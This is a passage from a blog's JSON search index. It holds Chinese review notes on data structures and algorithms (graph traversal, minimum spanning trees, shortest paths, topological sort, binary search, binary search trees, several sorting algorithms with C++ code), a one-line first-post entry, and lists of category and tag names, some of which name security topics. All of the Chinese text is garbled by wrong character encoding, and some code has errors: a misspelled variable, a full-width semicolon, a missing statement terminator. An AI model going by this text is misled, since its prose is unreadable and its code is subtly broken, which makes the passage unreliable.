&#123; //å¾ªç¯, è®¿é—®æ‰€æœ‰ç»“ç‚¹ Q.DeQueue (loc); w = G.getFirstNeighbor (loc); //ç¬¬ä¸€ä¸ªé‚»æ¥é¡¶ç‚¹ while (w != -1) &#123; //è‹¥é‚»æ¥é¡¶ç‚¹wå­˜åœ¨ if (!visited[w]) &#123; //è‹¥æœªè®¿é—®è¿‡ cout &lt;&lt; G.getValue (w) &lt;&lt; â€˜ â€™; //è®¿é—® visited[w] = true; Q.EnQueue (w); //é¡¶ç‚¹wè¿›é˜Ÿåˆ— &#125; w = G.getNextNeighbor (loc, w); //æ‰¾é¡¶ç‚¹locçš„ä¸‹ä¸€ä¸ªé‚»æ¥ç‚¹ &#125; &#125; delete [] visited; &#125; æœ€å°ç”Ÿæˆæ ‘ ç”»å‡ºè¯¥å›¾çš„DFSå’ŒBFSç”Ÿæˆæ ‘ DFSï¼š BFSï¼š Primç®—æ³•ç‰¹ç‚¹ï¼šå°†é¡¶ç‚¹å½’å¹¶ Kruskalç®—æ³•ç‰¹ç‚¹ï¼šå°†è¾¹å½’å¹¶ æœ€çŸ­è·¯å¾„éè´Ÿæƒå€¼çš„å•æºæœ€çŸ­è·¯å¾„Dijkstraç®—æ³• AOVç½‘AOVç½‘ï¼šåœ¨ä¸€ä¸ªæœ‰å‘å›¾ä¸­ï¼Œç”¨é¡¶ç‚¹è¡¨ç¤ºæ´»åŠ¨ï¼Œç”¨æœ‰å‘è¾¹è¡¨ç¤ºæ´»åŠ¨å…ˆåæ¬¡åºçš„æ‰§è¡Œã€‚è¿™ç§æœ‰å‘å›¾å«åšé¡¶ç‚¹è¡¨ç¤ºæ´»åŠ¨çš„AOVç½‘ç»œã€‚ æ‹“æ‰‘æ’åºï¼šæŒ‰ç…§æœ‰å‘å›¾ç»™å‡ºçš„æ¬¡åºå…³ç³»ï¼Œå°†å›¾ä¸­é¡¶ç‚¹æ’æˆä¸€ä¸ªçº¿æ€§åºåˆ—ï¼Œå¯¹äºæœ‰å‘å›¾ä¸­æ²¡æœ‰é™å®šæ¬¡åºå…³ç³»çš„é¡¶ç‚¹ï¼Œåˆ™å¯ä»¥äººä¸ºåŠ ä¸Šä»»æ„çš„æ¬¡åºå…³ç³»ã€‚ç”±æ­¤æ‰€å¾—é¡¶ç‚¹çš„çº¿æ€§åºåˆ—ç§°ä¸ºæ‹“æ‰‘æœ‰åºåºåˆ—ï¼Œæ„é€ æœ‰å‘å›¾çš„ä¸€ä¸ªæ‹“æ‰‘åºåˆ—çš„è¿‡ç¨‹ç§°ä¸ºæ‹“æ‰‘æ’åºã€‚ egï¼š æœç´¢æŠ˜åŠæœç´¢åŸºæœ¬æ€æƒ³ï¼šæŠ˜åŠæœç´¢æ—¶, å…ˆæ±‚ä½äºæœç´¢åŒºé—´æ­£ä¸­çš„å¯¹è±¡çš„ä¸‹æ ‡midï¼Œç”¨å…¶å…³é”®ç ä¸ç»™å®šå€¼xæ¯”è¾ƒ:Element[mid].key == xï¼Œæœç´¢æˆåŠŸï¼›Element[mid].key &gt; xï¼ŒæŠŠæœç´¢åŒºé—´ç¼©å°åˆ°è¡¨çš„å‰åŠéƒ¨åˆ†ï¼Œç»§ç»­æŠ˜åŠæœç´¢ï¼›Element[mid].key &lt; xï¼ŒæŠŠæœç´¢åŒºé—´ç¼©å°åˆ°è¡¨çš„ååŠéƒ¨åˆ†ï¼Œç»§ç»­æŠ˜åŠæœç´¢ã€‚ 12345678910111213141516171819202122232425int BinSearch1(int r[ ], int n, int k)&#123; //æ•°ç»„r[1] ~ r[n]å­˜æ”¾æŸ¥æ‰¾é›†åˆ low = 1; high = n; while (low &lt;= high) &#123; mid = (low + high) / 2; if (k &lt; r[mid]) high = mid - 1; else if (k &gt; r[mid]) low = mid + 1; else return mid; &#125; return 0;&#125;int BinSearch2(int r[ ], int low, int high, int k)&#123; //æ•°ç»„r[1] ~ r[n]å­˜æ”¾æŸ¥æ‰¾é›†åˆ if (low &gt; high) return 0; else &#123; mid = (low + high) / 2; if (k &lt; r[mid]) return BinSearch2(r, low, mid-1, k); else if (k &gt; r[mid]) return BinSearch2(r, mid+1, high, k); else return mid; &#125; &#125; äºŒå‰æœç´¢æ ‘å®šä¹‰ï¼šäºŒå‰æœç´¢æ ‘æ˜¯å…·æœ‰ä»¥ä¸‹æ€§è´¨çš„äºŒå‰æ ‘ æ‰€æœ‰ç»“ç‚¹çš„å…³é”®ç äº’ä¸ç›¸åŒã€‚ å·¦å­æ ‘ï¼ˆå¦‚æœéç©ºï¼‰ä¸Šæ‰€æœ‰ç»“ç‚¹çš„å…³é”®ç éƒ½å°äºæ ¹ç»“ç‚¹çš„å…³é”®ç ã€‚ å³å­æ ‘ï¼ˆå¦‚æœéç©ºï¼‰ä¸Šæ‰€æœ‰ç»“ç‚¹çš„å…³é”®ç éƒ½å¤§äºæ ¹ç»“ç‚¹çš„å…³é”®ç ã€‚ å·¦å­æ ‘å’Œå³å­æ ‘ä¹Ÿæ˜¯äºŒå‰æœç´¢æ ‘ã€‚ 123456789//æœç´¢ç®—æ³•template&lt;class E, class K&gt;BSTNode&lt;E, K&gt;* BST&lt;E, K&gt;:: Search (const K x, BSTNode&lt;E, K&gt; *ptr) &#123; if (ptr == NULL) return NULL; else if (x &lt; ptr-&gt;data) return Search(x, ptr-&gt;left); else if (x &gt; ptr-&gt;data) return Search(x, ptr-&gt;right); else return ptr; //æœç´¢æˆåŠŸ &#125;; äºŒå‰æœç´¢æ ‘çš„æ’å…¥12345678910111213//æ’å…¥template &lt;class E, class K&gt;bool BST&lt;E, K&gt;::Insert (const E&amp; e1, BSTNode&lt;E, K&gt; *&amp; ptr) &#123; //æ³¨æ„å‚æ•°å½¢å¼ if (ptr == NULL) &#123; //æ–°ç»“ç‚¹ä½œä¸ºå¶ç»“ç‚¹æ’å…¥ ptr = new BstNode&lt;E, K&gt;(e1); //åˆ›å»ºæ–°ç»“ç‚¹ if (ptr == NULL)&#123; cerr &lt;&lt; \"Out of space\" &lt;&lt; endl; exit(1); &#125; return true; &#125; else if (e1 &lt; ptr-&gt;data) return Insert (e1, ptr-&gt;left); else if (e1 &gt; ptr-&gt;data) return Insert (e1, ptr-&gt;right); else return false; //xå·²åœ¨æ ‘ä¸­,ä¸å†æ’å…¥&#125;; äºŒå‰æœç´¢æ ‘çš„åˆ é™¤æœ‰ä¸‰ç§æƒ…å†µï¼š è¢«åˆ çš„ç»“ç‚¹æ˜¯å¶å­ è¢«åˆ ç»“ç‚¹åªæœ‰å·¦å­æ ‘æˆ–åªæœ‰å³å­æ ‘ è¢«åˆ ç»“ç‚¹æ—¢æœ‰å·¦å­æ ‘åˆæœ‰å³å­æ ‘ æ’åº ç›´æ¥æ’å…¥æ’åºåŸºæœ¬æ€æƒ³ï¼šåœ¨æ’å…¥ç¬¬ iï¼ˆiï¼1ï¼‰ä¸ªè®°å½•æ—¶ï¼Œå‰é¢çš„ i-1ä¸ªè®°å½•å·²ç»æ’å¥½åºã€‚ å¹³å‡æƒ…å†µä¸‹æ’åºçš„æ—¶é—´å¤æ‚åº¦ä¸º o(n2)ã€‚ç›´æ¥æ’å…¥æ’åºæ˜¯ä¸€ç§ç¨³å®šçš„æ’åºæ–¹æ³•ã€‚ å¸Œå°”æ’åºåŸºæœ¬æ€æƒ³ï¼šå°†æ•´ä¸ªå¾…æ’åºè®°å½•åˆ†å‰²æˆè‹¥å¹²ä¸ªå­åºåˆ—ï¼Œåœ¨å­åºåˆ—å†…åˆ†åˆ«è¿›è¡Œç›´æ¥æ’å…¥æ’åºï¼Œå¾…æ•´ä¸ªåºåˆ—ä¸­çš„è®°å½•åŸºæœ¬æœ‰åºæ—¶ï¼Œå¯¹å…¨ä½“è®°å½•è¿›è¡Œç›´æ¥æ’å…¥æ’åºã€‚ gapé€šå¸¸å–ï¼š $gap=\\lfloor gap/3\\rfloor+1$ å¸Œå°”æ’åºæ˜¯ä¸€ç§ä¸ç¨³å®šçš„æ’åºç®—æ³•ã€‚ egï¼š 123456789101112131415161718//å¸Œå°”æ’åºçš„ç®—æ³•void Shellsort (dataList&lt;T&gt;&amp; L, const int left, const int right) &#123; int i, j, gap = right-left+1; //å¢é‡çš„åˆå§‹å€¼ä¸ºå¾…æ’åºä¸ªæ•° Element&lt;T&gt; temp; do &#123; gap = gap/3+1; //æ±‚ä¸‹ä¸€å¢é‡å€¼ for(i=left+gap;i&lt;=right;i++) if (L[i]&lt;L[i-gap]) &#123;//é€†åº temp=L[i]; j = i-gap; do &#123; L[j+gap] = L[j]; j= j-gap; &#125; while (j&gt;=left &amp;&amp; temp&lt;L[j]); L[j+gap]=temp; //å°†vector[i]å›é€ &#125; &#125; while (gap &gt; 1);&#125;; å†’æ³¡æ’åºåŸºæœ¬æ€æƒ³ï¼šä¸¤ä¸¤æ¯”è¾ƒç›¸é‚»è®°å½•çš„å…³é”®ç ï¼Œå¦‚æœååºåˆ™äº¤æ¢ï¼Œç›´åˆ°æ²¡æœ‰ååºçš„è®°å½•ä¸ºæ­¢ã€‚ 1234567891011void BubbleSort (T V[], int n ) &#123; bool exchange ; int i , j ; for (i=1;i&lt;n;i++)&#123; exchange = false; //æ ‡å¿—ä¸º0å‡å®šæœªäº¤æ¢ for (j=n-1;j&gt;= iï¼›j--) if (V[j-1]&gt;V[j]) &#123; //é€†åº T temp=V[j-1]; V[j-1]=V[j]; V[j]=temp//äº¤æ¢ exchange = true; //æ ‡å¿—ç½®ä¸º1,æœ‰äº¤æ¢ &#125;if(exchange==false) return; &#125; å¿«é€Ÿæ’åºåŸºæœ¬æ€æƒ³ï¼šå–å¾…æ’åºåºåˆ—ä¸­ä¸€ä¸ªå…ƒç´ ä½œä¸ºåŸºå‡†ï¼ŒæŒ‰ç…§è¯¥å…ƒç´ çš„æ’åºç çš„å¤§å°ï¼Œå°†æ•´ä¸ªå…ƒç´ åˆ†ä¸ºå·¦å³ä¸¤ä¸ªå­åºåˆ—ï¼Œå·¦ä¾§éƒ½å°äºè¯¥æ’åºç ï¼Œå³ä¾§éƒ½å¤§äºã€‚ç„¶åï¼Œé‡å¤å®è¡Œè¿™ä¸ªæ–¹æ³•ï¼Œç›´åˆ°åºåˆ—æœ‰åºã€‚ 123456789101112131415161718192021222324//å¿«é€Ÿæ’åºçš„ç®—æ³•template &lt;class T&gt;void QuickSort (dataList&lt;T&gt;&amp; L, int left, int right) &#123;//å¯¹Vector[left..right]è¿›è¡Œæ’if (left &lt; right) &#123; //å…ƒç´ åºåˆ—é•¿åº¦å¤§äº1æ—¶ int pivotpos = L.Partition (left, right); //åˆ’åˆ† QuickSort (L, left, pivotpos-1); QuickSort (L, pivotpos+1, right); &#125;&#125;ï¼›int Partition( SqList &amp;L, int low, int high)&#123; L.r[0] = L.r[low]; pivitkey = L.r[low].key; while( low &lt; high)&#123; while( low &lt; high &amp;&amp; L.r[high].key &gt;= pivotkey) --high; L.r[low] = L.r[high]; while( low &lt; high &amp;&amp; L.r[low].key &lt;= pivotkey) ++low; L.r[high] = L.r[low]; &#125; L.r[low] = L.r[0]; return low;&#125; å¿«é€Ÿæ’åºæ˜¯ä¸€ç§ä¸ç¨³å®šçš„æ’åºç®—æ³• å †æ’åº","categories":[{"name":"æ•°æ®ç»“æ„ä¸ç®—æ³•","slug":"æ•°æ®ç»“æ„ä¸ç®—æ³•","permalink":"https://pz1o.top/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"å¤ä¹ ","slug":"å¤ä¹ ","permalink":"https://pz1o.top/tags/%E5%A4%8D%E4%B9%A0/"},{"name":"æ•°æ®ç»“æ„","slug":"æ•°æ®ç»“æ„","permalink":"https://pz1o.top/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]},{"title":"æˆ‘çš„ç¬¬ä¸€ç¯‡åšå®¢","slug":"æˆ‘çš„ç¬¬ä¸€ç¯‡åšå®¢","date":"2020-06-27T14:56:15.000Z","updated":"2020-11-20T14:20:18.797Z","comments":true,"path":"2020/06/27/æˆ‘çš„ç¬¬ä¸€ç¯‡åšå®¢/","link":"","permalink":"https://pz1o.top/2020/06/27/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/","excerpt":"","text":"2020/6/27 æˆ‘çš„ç¬¬ä¸€ç¯‡åšå®¢","categories":[],"tags":[]}],"categories":[{"name":"PWN","slug":"PWN","permalink":"https://pz1o.top/categories/PWN/"},{"name":"CTF","slug":"CTF","permalink":"https://pz1o.top/categories/CTF/"},{"name":"linux","slug":"linux","permalink":"https://pz1o.top/categories/linux/"},{"name":"wp","slug":"wp","permalink":"https://pz1o.top/categories/wp/"},{"name":"web","slug":"web","permalink":"https://pz1o.top/categories/web/"},{"name":"è®¡ç½‘","slug":"è®¡ç½‘","permalink":"https://pz1o.top/categories/%E8%AE%A1%E7%BD%91/"},{"name":"Qt","slug":"Qt","permalink":"https://pz1o.top/categories/Qt/"},{"name":"å¤ç°","slug":"å¤ç°","permalink":"https://pz1o.top/categories/%E5%A4%8D%E7%8E%B0/"},{"name":"é€†å‘","slug":"é€†å‘","permalink":"https://pz1o.top/categories/%E9%80%86%E5%90%91/"},{"name":"ç¬”è®°","slug":"ç¬”è®°","permalink":"https://pz1o.top/categories/%E7%AC%94%E8%AE%B0/"},{"name":"BUU","slug":"BUU","permalink":"https://pz1o.top/categories/BUU/"},{"name":"å¼€å‘","slug":"å¼€å‘","permalink":"https://pz1o.top/categories/%E5%BC%80%E5%8F%91/"},{"name":"Docker","slug":"Docker","permalink":"https://pz1o.top/categories/Docker/"},{"name":"å‰ç«¯","slug":"å‰ç«¯","permalink":"https://pz1o.top/categories/%E5%89%8D%E7%AB%AF/"},{"name":"æ•°æ®ç»“æ„ä¸ç®—æ³•","slug":"æ•°æ®ç»“æ„ä¸ç®—æ³•","permalink":"https://pz1o.top/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://pz1o.top/tags/PWN/"},{"name":"CTF","slug":"CTF","permalink":"https://pz1o.top/tags/CTF/"},{"name":"wp","slug":"wp","permalink":"https://pz1o.top/tags/wp/"},{"name":"è¯»ä¹¦ç¬”è®°","slug":"è¯»ä¹¦ç¬”è®°","permalink":"https://pz1o.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"},{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"https://pz1o.top/tags/%E5%88%B7%E9%A2%98/"},{"name":"linux","slug":"linux","permalink":"https://pz1o.top/tags/linux/"},{"name":"å †","slug":"å †","permalink":"https://pz1o.top/tags/%E5%A0%86/"},{"name":"web","slug":"web","permalink":"https://pz1o.top/tags/web/"},{"name":"xss","slug":"xss","permalink":"https://pz1o.top/tags/xss/"},{"name":"è®¡ç½‘","slug":"è®¡ç½‘","permalink":"https://pz1o.top/tags/%E8%AE%A1%E7%BD%91/"},{"name":"æ–‡ä»¶åŒ…å«","slug":"æ–‡ä»¶åŒ…å«","permalink":"https://pz1o.top/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"Qt","slug":"Qt","permalink":"https://pz1o.top/tags/Qt/"},{"name":"å®éªŒ","slug":"å®éªŒ","permalink":"https://pz1o.top/tags/%E5%AE%9E%E9%AA%8C/"},{"name":"å¤ç°","slug":"å¤ç°","permalink":"https://pz1o.top/tags/%E5%A4%8D%E7%8E%B0/"},{"name":"é€†å‘","slug":"é€†å‘","permalink":"https://pz1o.top/tags/%E9%80%86%E5%90%91/"},{"name":"é¢˜è§£","slug":"é¢˜è§£","permalink":"https://pz1o.top/tags/%E9%A2%98%E8%A7%A3/"},{"name":"åå¼¹shell","slug":"åå¼¹shell","permalink":"https://pz1o.top/tags/%E5%8F%8D%E5%BC%B9shell/"},{"name":"æ€»ç»“","slug":"æ€»ç»“","permalink":"https://pz1o.top/tags/%E6%80%BB%E7%BB%93/"},{"name":"å¼€å‘","slug":"å¼€å‘","permalink":"https://pz1o.top/tags/%E5%BC%80%E5%8F%91/"},{"name":"python","slug":"python","permalink":"https://pz1o.top/tags/python/"},{"name":"Docker","slug":"Docker","permalink":"https://pz1o.top/tags/Docker/"},{"name":"å‰ç«¯","slug":"å‰ç«¯","permalink":"https://pz1o.top/tags/%E5%89%8D%E7%AB%AF/"},{"name":"å­¦ä¹ ","slug":"å­¦ä¹ ","permalink":"https://pz1o.top/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"å¤ä¹ ","slug":"å¤ä¹ ","permalink":"https://pz1o.top/tags/%E5%A4%8D%E4%B9%A0/"},{"name":"æ•°æ®ç»“æ„","slug":"æ•°æ®ç»“æ„","permalink":"https://pz1o.top/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]}